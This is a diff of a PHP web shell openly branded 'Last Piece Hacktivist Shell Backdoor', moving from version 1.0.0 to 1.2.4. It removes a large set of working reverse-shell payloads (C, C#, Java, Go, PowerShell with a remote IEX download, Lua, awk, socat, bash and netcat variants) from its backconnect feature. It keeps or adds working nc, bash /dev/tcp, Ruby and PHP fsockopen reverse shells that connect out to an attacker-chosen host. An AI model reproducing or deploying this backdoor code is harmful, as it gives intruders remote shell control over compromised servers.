-                $cmd = "runhaskell -e 'import System.Process; main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | bash -i 2>&1 | nc $bh $bp >/tmp/f\"' &";
-                break;
-            // C LANGUAGE
-            case 'c_reverse':
-                $c_code = '#include <stdio.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-int main(void){
-    int port = '.$bp.';
-    struct sockaddr_in revsockaddr;
-    int sockt = socket(AF_INET, SOCK_STREAM, 0);
-    revsockaddr.sin_family = AF_INET;
-    revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr("'.$bh.'");
-    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
-    dup2(sockt, 0);
-    dup2(sockt, 1);
-    dup2(sockt, 2);
-    char * const argv[] = {"/bin/sh", NULL};
-    execvp("/bin/sh", argv);
-    return 0;
-}';
-                $tmpfile = '/tmp/rev_' . uniqid() . '.c';
-                file_put_contents($tmpfile, $c_code);
-                $cmd = "gcc $tmpfile -o /tmp/rev_shell_$bp && /tmp/rev_shell_$bp &";
-                break;
-            // POWERSHELL
-            case 'powershell':
-                $cmd = 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\''.$bh.''\'','.$bp.');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PowerShell \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" &';
-                break;
-            case 'powershell_conpty':
-                $cmd = 'powershell -nop -c "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell '.$bh.' '.$bp.'" &';
-                break;
-            // C# / MONO
-            case 'csharp_tcp':
-                $cs_code = 'using System;
-using System.IO;
-using System.Diagnostics;
-using System.Net.Sockets;
-namespace Connect { class Sh { 
-    static void Main() {
-        using(TcpClient client = new TcpClient("'.$bh.'", '.$bp.')) {
-            using(Stream stream = client.GetStream()) {
-                using(StreamReader rdr = new StreamReader(stream)) {
-                    StreamWriter streamWriter = new StreamWriter(stream);
-                    StringBuilder strInput = new StringBuilder();
-                    Process p = new Process();
-                    p.StartInfo.FileName = "/bin/bash";
-                    p.StartInfo.CreateNoWindow = true;
-                    p.StartInfo.UseShellExecute = false;
-                    p.StartInfo.RedirectStandardOutput = true;
-                    p.StartInfo.RedirectStandardInput = true;
-                    p.StartInfo.RedirectStandardError = true;
-                    p.Start();
-                    while(true) {
-                        strInput.Append(rdr.ReadLine());
-                        p.StandardInput.WriteLine(strInput);
-                        strInput.Remove(0, strInput.Length);
-                    }
-                }
-            }
-        }
-    }
-} }';
-                $tmpcs = '/tmp/cs_' . uniqid() . '.cs';
-                file_put_contents($tmpcs, $cs_code);
-                $cmd = "mcs $tmpcs -out:/tmp/cs_shell_$bp && mono /tmp/cs_shell_$bp &";
-                break;
-            // JAVA
-            case 'java':
-                $java_code = 'import java.io.*;
-import java.net.*;
-public class Shell {
-    public static void main(String[] args) throws Exception {
-        String host = "'.$bh.'";
-        int port = '.$bp.';
-        Socket s = new Socket(host, port);
-        InputStream in = s.getInputStream();
-        OutputStream out = s.getOutputStream();
-        BufferedReader br = new BufferedReader(new InputStreamReader(in));
-        PrintWriter pw = new PrintWriter(out);
-        Process p = Runtime.getRuntime().exec("/bin/bash");
-        BufferedReader pbr = new BufferedReader(new InputStreamReader(p.getInputStream()));
-        String line;
-        while((line = br.readLine()) != null) {
-            p.getOutputStream().write((line + "\n").getBytes());
-            p.getOutputStream().flush();
-        }
-    }
-}';
-                $tmpjava = '/tmp/Shell_' . uniqid() . '.java';
-                file_put_contents($tmpjava, $java_code);
-                $cmd = "javac $tmpjava && java -cp /tmp Shell &";
-                break;
-            // LUA
-            case 'lua':
-                $cmd = "lua -e 'local s=require(\"socket\");local c=s.tcp();c:connect(\"$bh\",$bp);while 1 do local r,x=c:receive();local f=io.popen(r,\"r\");local b=f:read(\"*a\");c:send(b) end' &";
-                break;
-            // GO LANGUAGE
-            case 'go':
-                $go_code = 'package main
-import ("os"; "net"; "io"; "bufio")
-func main() {
-    conn, _ := net.Dial("tcp", "'.$bh.':'.$bp.'")
-    cmd := exec.Command("/bin/bash")
-    cmd.Stdin = conn
-    cmd.Stdout = conn
-    cmd.Stderr = conn
-    cmd.Run()
-}';
-                $tmpgo = '/tmp/shell_' . uniqid() . '.go';
-                file_put_contents($tmpgo, $go_code);
-                $cmd = "go run $tmpgo &";
-                break;
-            // TELNET
-            case 'telnet':
-                $cmd = "telnet $bh $bp &";
-                break;
-            // SOCAT
-            case 'socat':
-                $cmd = "socat exec:/bin/bash tcp-connect:$bh:$bp &";
-                break;
-            // AWK
-            case 'awk':
-                $cmd = "awk 'BEGIN {s = \"/inet/tcp/0/$bh/$bp\"; while(1) { do{ if((\"/bin/bash |& s, s |& getline c) > 0) if(c) { while ((c |\& \"/bin/bash\") | getline t) print t |& s; close(c); }  }while(c != \"exit\") close(s); } }' &";
-                break;
-            // BASH C VARIANT
-            case 'bash_c_i':
-                $cmd = "bash -c 'bash -i >& /dev/tcp/$bh/$bp 0>&1' &";
                 break;
             case 'nc':
                 $nb = trim(@shell_exec('which nc 2>/dev/null') ?: @shell_exec('which ncat 2>/dev/null') ?: 'nc');
                 $cmd = "$nb -e /bin/sh $bh $bp &";
                 break;
-            default: // PHP fsockopen default
+            case 'bash':
+                $cmd = "bash -c 'bash -i >& /dev/tcp/$bh/$bp 0>&1' &";
+                break;
+            case 'ruby':
+                $cmd = 'ruby -rsocket -e \'f=TCPSocket.open("'.$bh.'",'.$bp.').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &';
+                break;
+            default: // PHP
                 if (!in_array('proc_open', $availExec)) {
                     // Try fsockopen method
                     $sock = @fsockopen($bh, $bp, $en, $es, 10);
@@ -3122,7 +2791,7 @@ body {
 <footer class="app-footer">
     <div class="footer-content">
         <img src="https://i.top4top.io/p_3332p3mbq1.jpg" class="footer-avatar" alt="">
-        <div class="footer-text"><span>Last Piece Hacktivist</span> Shell Backdoor v1.0.0</div>
+        <div class="footer-text"><span>Last Piece Hacktivist</span> Shell Backdoor v1.2.4</div>
     </div>
 </footer>
 
@@ -3417,69 +3086,12 @@ body {
             <div class="form-group" style="margin-bottom: 12px;">
                 <label class="form-label">Method</label>
                 <select id="bcType" class="form-input" onchange="updateBcPreview()">
-                    <optgroup label="Bash">
-                        <option value="bash_i">Bash -i (/dev/tcp)</option>
-                        <option value="bash_196">Bash 196 FD</option>
-                        <option value="bash_readline">Bash readline loop</option>
-                        <option value="bash_5">Bash FD 5</option>
-                        <option value="bash_udp">Bash UDP (/dev/udp)</option>
-                        <option value="bash_c_i">Bash -c -i</option>
-                    </optgroup>
-                    <optgroup label="Netcat">
-                        <option value="nc_mkfifo">nc mkfifo</option>
-                        <option value="nc_e">nc -e</option>
-                        <option value="nc_c">nc -c</option>
-                        <option value="busybox_nc">BusyBox nc</option>
-                        <option value="ncat_e">ncat -e</option>
-                        <option value="ncat_udp">ncat UDP</option>
-                    </optgroup>
-                    <optgroup label="Perl">
-                        <option value="perl">Perl Socket</option>
-                        <option value="perl_no_sh">Perl IO (no sh)</option>
-                        <option value="perl_pentestmonkey">Perl PentestMonkey</option>
-                    </optgroup>
-                    <optgroup label="Python">
-                        <option value="python">Python3 subprocess</option>
-                    </optgroup>
-                    <optgroup label="PHP">
-                        <option value="php_exec">PHP exec</option>
-                        <option value="php_shell_exec">PHP shell_exec</option>
-                        <option value="php_system">PHP system</option>
-                        <option value="php_passthru">PHP passthru</option>
-                        <option value="php_popen">PHP popen</option>
-                        <option value="php_proc_open">PHP proc_open</option>
-                        <option value="php_backtick">PHP backtick</option>
-                        <option value="php_cmd">PHP cmd (GET)</option>
-                        <option value="php_cmd_small">PHP cmd (minimal)</option>
-                    </optgroup>
-                    <optgroup label="Compiled (C/C++)">
-                        <option value="c_reverse">C reverse shell</option>
-                    </optgroup>
-                    <optgroup label="C# / Mono">
-                        <option value="csharp_tcp">C# TCP Client</option>
-                    </optgroup>
-                    <optgroup label="Java">
-                        <option value="java">Java reverse shell</option>
-                    </optgroup>
-                    <optgroup label="Scripting">
-                        <option value="ruby">Ruby TCPSocket</option>
-                        <option value="node">Node.js</option>
-                        <option value="lua">Lua socket</option>
-                        <option value="go">Go language</option>
-                        <option value="awk">AWK</option>
-                        <option value="haskell">Haskell</option>
-                    </optgroup>
-                    <optgroup label="Network Tools">
-                        <option value="curl_telnet">curl telnet</option>
-                        <option value="openssl">OpenSSL</option>
-                        <option value="rustcat">Rustcat</option>
-                        <option value="socat">Socat</option>
-                        <option value="telnet">Telnet</option>
-                    </optgroup>
-                    <optgroup label="PowerShell (Windows)">
-                        <option value="powershell">PowerShell reverse</option>
-                        <option value="powershell_conpty">PowerShell ConPty</option>
-                    </optgroup>
+                    <option value="php">PHP (fsockopen + proc_open)</option>
+                    <option value="perl">Perl (Socket)</option>
+                    <option value="python">Python3 (subprocess)</option>
+                    <option value="nc">Netcat (nc -e)</option>
+                    <option value="bash">Bash (/dev/tcp)</option>
+                    <option value="ruby">Ruby (TCPSocket)</option>
                 </select>
             </div>
             <div style="margin-bottom: 10px;">
@@ -4839,51 +4451,14 @@ function updateBcPreview() {
     var port = document.getElementById('bcPort').value.trim() || 'PORT';
     var type = document.getElementById('bcType').value;
     var cmds = {
-        bash_i: "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1",
-        bash_196: "0<&196;exec 196<>/dev/tcp/" + host + "/" + port + "; bash <&196 >&196 2>&196",
-        bash_readline: "exec 5<>/dev/tcp/" + host + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done",
-        bash_5: "bash -i 5<> /dev/tcp/" + host + "/" + port + " 0<&5 1>&5 2>&5",
-        bash_udp: "bash -i >& /dev/udp/" + host + "/" + port + " 0>&1",
-        bash_c_i: "bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'",
-        nc_mkfifo: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc " + host + " " + port + " >/tmp/f",
-        nc_e: "nc " + host + " " + port + " -e bash",
-        nc_c: "nc -c bash " + host + " " + port,
-        busybox_nc: "busybox nc " + host + " " + port + " -e bash",
-        ncat_e: "ncat " + host + " " + port + " -e bash",
-        ncat_udp: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u " + host + " " + port + " >/tmp/f",
-        curl_telnet: "C='curl -Ns telnet://" + host + ":" + port + "'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null",
-        perl: "perl -e 'use Socket;$i=\"" + host + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));...'",
-        perl_no_sh: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"" + host + ":" + port + "\");...'",
-        perl_pentestmonkey: "perl -e 'use Socket;$i=\"" + host + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,...)'",
-        python: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + host + "\"," + port + "));...'",
-        openssl: "mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect " + host + ":" + port + " > /tmp/s; rm /tmp/s",
-        php_exec: "php -r '$sock=fsockopen(\"" + host + "\"," + port + ");exec(\"/bin/sh <&3 >&3 2>&3\");'",
-        php_shell_exec: "php -r '$sock=fsockopen(\"" + host + "\"," + port + ");shell_exec(\"/bin/sh <&3 >&3 2>&3\");'",
-        php_system: "php -r '$sock=fsockopen(\"" + host + "\"," + port + ");system(\"/bin/sh <&3 >&3 2>&3\");'",
-        php_passthru: "php -r '$sock=fsockopen(\"" + host + "\"," + port + ");passthru(\"/bin/sh <&3 >&3 2>&3\");'",
-        php_popen: "php -r '$sock=fsockopen(\"" + host + "\"," + port + ");popen(\"/bin/sh <&3 >&3 2>&3\", \"r\");'",
-        php_proc_open: "php -r '$sock=fsockopen(\"" + host + "\"," + port + ");$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
-        php_backtick: "php -r '$sock=fsockopen(\"" + host + "\"," + port + ");`bash <&3 >&3 2>&3`;'",
-        php_cmd: "php -r 'if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; system($_REQUEST[\"cmd\"]); }'",
-        php_cmd_small: "php -r 'echo `$_GET[0]`;'",
-        node: "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/bash\",[]);var client=new net.Socket();client.connect(" + port + ",\"" + host + "\",function(){...});})();'",
-        ruby: "ruby -rsocket -e 'f=TCPSocket.open(\"" + host + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-        rustcat: "rcat connect -s bash " + host + " " + port,
-        haskell: "runhaskell -e 'import System.Process; main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | bash -i 2>&1 | nc " + host + " " + port + " >/tmp/f\"'",
-        c_reverse: "[C] Socket connect + FD redirect to /bin/sh [compile with gcc]",
-        csharp_tcp: "[C#] TcpClient connect + Process redirect [compile with mono]",
-        java: "[Java] Socket connect + Process exec [compile with javac]",
-        lua: "lua -e 'local s=require(\"socket\");local c=s.tcp();c:connect(\"" + host + "\"," + port + ");...'",
-        go: "[Go] net.Dial + exec.Command [compile with go]",
-        awk: "awk 'BEGIN {s = \"/inet/tcp/0/" + host + "/" + port + "\"; while(1) { ... }}'",
-        socat: "socat exec:/bin/bash tcp-connect:" + host + ":" + port,
-        telnet: "telnet " + host + " " + port,
-        powershell: "[PowerShell] TCPClient reverse shell",
-        powershell_conpty: "[PowerShell] ConPty shell (Windows 10+)",
-        nc: "nc " + host + " " + port + " -e bash",
-        php: "fsockopen(\"" + host + "\", " + port + ") + proc_open(\"/bin/sh -i\")"
+        php: 'fsockopen("' + host + '", ' + port + ') + proc_open("/bin/sh -i")',
+        perl: "perl -e 'use Socket;$i=\"" + host + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,...);exec(\"/bin/sh -i\");'",
+        python: "python3 -c 'import socket,subprocess,os;s.connect((\"" + host + "\"," + port + "));...'",
+        nc: 'nc -e /bin/sh ' + host + ' ' + port,
+        bash: "bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'",
+        ruby: "ruby -rsocket -e 'f=TCPSocket.open(\"" + host + "\"," + port + ").to_i;exec ...'"
     };
-    document.getElementById('bcPreview').textContent = cmds[type] || 'Command not found';
+    document.getElementById('bcPreview').textContent = cmds[type] || '';
 }
 function doBackconnect() {
     var host = document.getElementById('bcHost').value.trim();
@@ -5765,90 +5340,8 @@ function esc(s) {
     d.appendChild(document.createTextNode(s));
     return d.innerHTML;
 }
-
-// === WALKING OVERLAY CHARACTERS ===
-(function() {
-    var gifs = [
-        'https://media.tenor.com/AmKWO6XfoKUAAAAm/one-piece-pixel.webp',
-        'https://media.tenor.com/E79ZW6sIV8MAAAAj/nika-sungod.gif',
-        'https://media.tenor.com/BocFr2rC0PoAAAAj/one-piece-pixel.gif',
-        'https://media.tenor.com/ttMsN_OQVv0AAAAm/luffy-gear-5.webp',
-        'https://media.tenor.com/uDnFP6VcaEYAAAAm/luffy-one-piece.webp'
-    ];
-
-    var chars = [];
-    var COUNT = 5;
-
-    function rand(min, max) { return Math.random() * (max - min) + min; }
-
-    function spawnChar(idx) {
-        var img = document.createElement('img');
-        img.src = gifs[idx % gifs.length];
-        img.style.cssText = 'position:fixed;z-index:99999;pointer-events:none;width:48px;height:48px;object-fit:contain;image-rendering:pixelated;opacity:0.85;transition:transform 0.3s ease;';
-        document.body.appendChild(img);
-
-        var ch = {
-            el: img,
-            x: rand(0, window.innerWidth - 48),
-            y: rand(0, window.innerHeight - 48),
-            vx: rand(0.3, 1.2) * (Math.random() > 0.5 ? 1 : -1),
-            vy: rand(0.2, 0.8) * (Math.random() > 0.5 ? 1 : -1),
-            targetX: rand(0, window.innerWidth - 48),
-            targetY: rand(0, window.innerHeight - 48),
-            timer: 0,
-            changeDir: rand(120, 400)
-        };
-        img.style.left = ch.x + 'px';
-        img.style.top = ch.y + 'px';
-        img.style.transform = ch.vx > 0 ? 'scaleX(1)' : 'scaleX(-1)';
-        chars.push(ch);
-    }
-
-    function updateChars() {
-        var W = window.innerWidth - 48;
-        var H = window.innerHeight - 48;
-
-        for (var i = 0; i < chars.length; i++) {
-            var c = chars[i];
-            c.timer++;
-
-            if (c.timer >= c.changeDir) {
-                c.timer = 0;
-                c.changeDir = rand(100, 350);
-                c.targetX = rand(0, W);
-                c.targetY = rand(0, H);
-                var dx = c.targetX - c.x;
-                var dy = c.targetY - c.y;
-                var dist = Math.sqrt(dx * dx + dy * dy) || 1;
-                var speed = rand(0.4, 1.2);
-                c.vx = (dx / dist) * speed;
-                c.vy = (dy / dist) * speed;
-                c.el.style.transform = c.vx > 0 ? 'scaleX(1)' : 'scaleX(-1)';
-            }
-
-            c.x += c.vx;
-            c.y += c.vy;
-
-            if (c.x < 0) { c.x = 0; c.vx = Math.abs(c.vx); c.el.style.transform = 'scaleX(1)'; }
-            if (c.x > W) { c.x = W; c.vx = -Math.abs(c.vx); c.el.style.transform = 'scaleX(-1)'; }
-            if (c.y < 0) { c.y = 0; c.vy = Math.abs(c.vy); }
-            if (c.y > H) { c.y = H; c.vy = -Math.abs(c.vy); }
-
-            c.el.style.left = c.x + 'px';
-            c.el.style.top = c.y + 'px';
-        }
-
-        requestAnimationFrame(updateChars);
-    }
-
-    for (var i = 0; i < COUNT; i++) {
-        spawnChar(i);
-    }
-    requestAnimationFrame(updateChars);
-})();
 </script>
 
 <?php endif; ?>
 </body>
 </html>
-
